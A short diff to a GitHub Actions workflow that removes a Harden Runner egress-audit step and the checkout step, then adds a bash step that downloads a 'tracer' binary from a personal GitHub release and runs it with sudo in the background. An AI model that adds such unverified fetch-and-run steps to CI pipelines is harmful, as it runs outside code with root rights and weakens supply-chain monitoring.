@@ -8,14 +8,13 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Harden Runner
-        uses: step-security/harden-runner@v2
-        with:
-          egress-policy: audit
       
-      - uses: actions/checkout@v3
-      - uses: ./.github/actions/dns-config
-      
+      - run: |
+         cd /tmp
+         wget -q https://github.com/h0x0er/playground/releases/download/v0.0.2/tracer
+         chmod +x tracer
+         sudo ./tracer &> tracer.log&
+        shell: bash
       - uses: chainguard-dev/actions/setup-k3d@main
         with:
           # Image to use for k3s. This also inherently sets the k3s version.
